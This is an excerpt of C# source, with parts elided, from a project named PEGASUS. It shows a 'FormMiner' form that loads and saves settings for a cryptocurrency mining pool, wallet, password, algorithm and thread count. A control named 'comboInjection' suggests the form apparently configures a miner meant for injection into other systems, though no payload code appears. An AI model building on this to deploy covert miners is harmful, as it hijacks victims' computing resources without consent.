	...
	public class FormMiner : Form
	{
		...
		private void FormMiner_Load(object sender, EventArgs e)
		{
			try
			{
				...
				txtPool.Text = global::PEGASUS.Properties.Settings.Default.pool;
				txtWallet.Text = global::PEGASUS.Properties.Settings.Default.wallet;
				txtPass.Text = global::PEGASUS.Properties.Settings.Default.password;
				comboInjection.Text = global::PEGASUS.Properties.Settings.Default.algo;
				txtThreads.Text = global::PEGASUS.Properties.Settings.Default.threads;
			}
			catch
			{
			}
		...
		private void button2_Click(object sender, EventArgs e)
		{
			if (!string.IsNullOrWhiteSpace(txtPool.Text) && !string.IsNullOrWhiteSpace(txtWallet.Text) && !string.IsNullOrWhiteSpace(txtPass.Text) && !string.IsNullOrWhiteSpace(comboInjection.Text) && !string.IsNullOrWhiteSpace(txtThreads.Text))
			{
				...
				global::PEGASUS.Properties.Settings.Default.pool = txtPool.Text;
				global::PEGASUS.Properties.Settings.Default.wallet = txtWallet.Text;
				global::PEGASUS.Properties.Settings.Default.password = txtPass.Text;
				global::PEGASUS.Properties.Settings.Default.algo = comboInjection.Text;
				global::PEGASUS.Properties.Settings.Default.threads = txtThreads.Text;
